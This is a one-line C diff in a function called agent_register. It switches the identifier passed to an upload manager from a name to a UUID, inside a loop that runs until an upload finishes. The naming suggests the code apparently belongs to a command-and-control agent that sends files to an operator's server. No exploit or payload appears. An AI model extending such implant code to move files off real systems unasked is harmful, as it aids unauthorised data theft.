@@ -75,7 +75,7 @@ void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *name = unpack_str(task->parameters, &offset);
 	char *uuid = unpack_str(task->parameters, &offset);
 
-	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, name);
+	UploadManager upload = initialise_upload_manager(state->params.callback_uuid, task->id, uuid);
 	
 	while (upload.finished == FALSE) {
 		BOOL result = perform_upload(state, &upload);
